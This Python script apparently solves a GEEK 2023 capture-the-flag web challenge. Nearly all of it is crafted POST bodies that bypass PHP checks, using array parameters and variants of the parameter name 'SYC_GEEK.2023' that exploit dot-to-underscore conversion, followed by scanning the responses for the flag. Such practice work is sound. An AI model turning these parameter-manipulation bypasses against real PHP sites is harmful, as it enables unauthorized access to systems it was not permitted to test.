import urllib.request, re, html, uuid

url = 'http://80-2005f10e-b861-4aa9-8f0c-bc279804f290.challenge.ctfplus.cn'
base = url + '?syc=Welcome+to+GEEK+2023%21%0a&lover=2022e1'

def try_body(label, body, ct='application/x-www-form-urlencoded'):
    req = urllib.request.Request(base, data=body, headers={
        'User-Agent': 'Mozilla/5.0', 'Content-Type': ct})
    resp = urllib.request.urlopen(req, timeout=10)
    text = html.unescape(re.sub(r'<[^>]+>', '', resp.read().decode('utf-8', errors='replace')))
    idx = text.find('?>')
    text = text[idx+2:].strip() if idx > 0 else ''
    for pat in ['Geesec{', 'flag{', 'CTF{', 'ISCC{', 'GEEK{']:
        if pat in text:
            i = text.find(pat); e = text.find('}', i)
            if e > i: print(f"FLAG: {text[i:e+1]} ({label})"); return True
    short = text.replace(chr(0xa0),' ')[:80]
    print(f"[{label}] -> {short}")
    return False

# Space-prefixed (PHP might strip leading space but keep dot)
try_body('space prefix', b'qw[]=a&yxx[]=b& SYC_GEEK.2023=Happy to see you!')
try_body('tab prefix', b'qw[]=a&yxx[]=b&\tSYC_GEEK.2023=Happy to see you!')

# Double dot
try_body('double dot', b'qw[]=a&yxx[]=b&SYC_GEEK..2023=Happy to see you!')

# Bracket array access in key: SYC_GEEK[.2023]
try_body('bracket dot2', b'qw[]=a&yxx[]=b&SYC_GEEK[.2023]=Happy to see you!')

# Send the payload in query string too (PHP might merge $_GET + $_POST?)
try_body('qs too', b'qw[]=a&yxx[]=b')
# Actually test with query string in URL instead
full_url = url + '?syc=Welcome+to+GEEK+2023%21%0a&lover=2022e1&SYC_GEEK.2023=Happy+to+see+you%21'
req = urllib.request.Request(full_url, data=b'qw[]=a&yxx[]=b', headers={
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'})
resp = urllib.request.urlopen(req, timeout=10)
text = html.unescape(re.sub(r'<[^>]+>', '', resp.read().decode('utf-8', errors='replace')))
idx = text.find('?>'); text = text[idx+2:].strip() if idx > 0 else ''
for pat in ['Geesec{', 'flag{', 'CTF{', 'ISCC{', 'GEEK{']:
    if pat in text:
        i = text.find(pat); e = text.find('}', i)
        if e > i: print(f"FLAG: {text[i:e+1]} (qs inject)"); break
else:
    print(f"[qs inject] -> {text.replace(chr(0xa0),' ')[:80]}")

# Try sending BOTH ways: POST with bracket AND POST with dot (key collision)
boundary = '----WebKitFormBoundary' + uuid.uuid4().hex[:16]
mp = (f'--{boundary}\r\nContent-Disposition: form-data; name="qw[]"\r\n\r\na\r\n'
      f'--{boundary}\r\nContent-Disposition: form-data; name="yxx[]"\r\n\r\nb\r\n'
      f'--{boundary}\r\nContent-Disposition: form-data; name="SYC_GEEK_2023"\r\n\r\n'
      f'Happy to see you!\r\n'
      f'--{boundary}\r\nContent-Disposition: form-data; name="SYC_GEEK.2023"\r\n\r\n'
      f'Happy to see you!\r\n'
      f'--{boundary}--\r\n').encode()
try_body('both multipart', mp, f'multipart/form-data; boundary={boundary}')
